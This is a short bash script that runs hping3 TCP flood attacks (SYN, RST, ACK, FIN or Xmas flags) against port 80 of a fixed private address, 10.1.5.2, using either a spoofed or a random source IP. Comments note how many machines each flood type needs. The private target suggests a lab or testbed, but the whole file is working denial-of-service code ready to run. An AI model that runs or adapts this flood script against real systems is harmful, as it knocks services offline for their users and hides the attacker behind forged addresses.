#!/bin/bash

# -S: 1 machine is enough
# -R: 2 machine are enough, better 3
# -A: 1 machine is enough
# -F: 3 machines
# -X: 3 machines

if [ $# -ge 2 ]
then
    if [ "$1" ] && [ "$2" ]
    then
        echo "START SPOOFED SOURCE"
        sudo hping3 -$2 --flood --destport 80 -a $1 10.1.5.2 > /dev/null
    fi

elif [ $# == 1 ]
then
    echo "START RANDOM SOURCE"
    sudo hping3 -$1 --flood --destport 80 --rand-source 10.1.5.2 > /dev/null
else
    echo "Usage: ./tcp.sh <S,R,A,F,X> <SPOOF IP>"    
fi
